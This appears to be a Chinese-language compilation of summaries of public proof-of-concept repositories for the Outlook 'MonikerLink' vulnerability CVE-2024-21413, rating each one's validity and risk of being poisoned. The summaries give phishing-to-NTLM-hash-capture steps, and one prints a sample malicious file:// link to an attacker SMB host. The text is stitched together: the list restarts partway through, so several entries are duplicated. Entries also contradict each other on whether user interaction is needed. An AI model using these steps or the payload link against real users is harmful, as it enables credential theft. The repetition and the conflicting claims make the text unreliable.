3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

